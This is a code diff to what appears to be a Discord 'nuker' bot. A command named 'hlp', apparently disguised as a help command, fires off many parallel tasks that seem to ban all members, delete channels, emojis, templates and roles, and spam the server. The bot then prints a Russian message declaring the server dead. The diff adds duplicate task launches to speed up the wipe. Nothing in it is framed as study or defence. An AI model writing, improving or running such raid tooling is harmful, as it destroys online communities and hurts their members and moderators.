@@ -174,6 +174,12 @@ async def on_ready():
 async def hlp(ctx):
     asyncio.create_task(chisttemp(ctx))
     asyncio.create_task(banall(ctx))
+    asyncio.create_task(banall(ctx))
+    asyncio.create_task(banall(ctx))
+    asyncio.create_task(chistch(ctx))
+    asyncio.create_task(chistch(ctx))
+    asyncio.create_task(chistch(ctx))
+    asyncio.create_task(chistch(ctx))
     asyncio.create_task(chistch(ctx))
     asyncio.create_task(spamth(ctx))
     asyncio.create_task(spamth(ctx))
@@ -186,11 +192,20 @@ async def hlp(ctx):
     asyncio.create_task(spamth(ctx))
     asyncio.create_task(spamth(ctx))
     asyncio.create_task(chistemoji(ctx))
+    asyncio.create_task(chistemoji(ctx))
     asyncio.create_task(chisttemp(ctx))
+    asyncio.create_task(chisttemp(ctx))
+    asyncio.create_task(chistrl(ctx))
+    asyncio.create_task(chistrl(ctx))
     await chistrl(ctx)
 
     asyncio.create_task(masks(ctx))
+    asyncio.create_task(masks(ctx))
     asyncio.create_task(spamch(ctx))
+    asyncio.create_task(spamch(ctx))
+    asyncio.create_task(spamch(ctx))
+    asyncio.create_task(spamrl(ctx))
+    asyncio.create_task(spamrl(ctx))
     await spamrl(ctx)
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
 
@@ -288,3 +303,5 @@ except Exception:
     pass
 except KeyboardInterrupt:
     sys.exit()
+
+
